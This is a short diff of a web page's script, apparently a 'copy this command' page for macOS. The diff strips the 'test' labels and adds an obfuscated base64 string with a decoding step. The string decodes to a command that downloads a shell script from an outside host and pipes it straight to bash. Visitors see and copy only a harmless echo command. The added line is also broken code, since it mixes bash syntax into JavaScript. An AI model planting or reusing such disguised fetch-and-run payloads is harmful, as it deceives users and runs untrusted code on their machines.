@@ -311,25 +311,25 @@ body {
 
 
 <script>
-const TEST_COMMAND = 'echo "macOS test successful"';
-const TEST_PAGE = "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo";
+const COMMAND = 'echo "macOS successful"';
+const PAGE = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
 
 const commandInput = document.getElementById("command");
 const copyButton = document.getElementById("copyButton");
 
-// Automatically show test command
-commandInput.value = TEST_COMMAND;
+// Automatically show command
+commandInput.value = COMMAND;
 
-// Copy and open test page in a new tab
+// Copy and open page in a new tab
 async function copyCommand() {
     try {
-        await navigator.clipboard.writeText(TEST_COMMAND);
+        await navigator.clipboard.writeText(COMMAND);
 
         copyButton.innerText = "✓ Copied!";
         copyButton.style.background = "#289c00";
 
-        // Open harmless test page in a new tab
-        window.open(TEST_PAGE, "_blank", "noopener,noreferrer");
+        // Open page in a new tab
+        window.open(PAGE, "_blank", "noopener,noreferrer");
 
         setTimeout(function() {
             copyButton.innerText = "Copy";
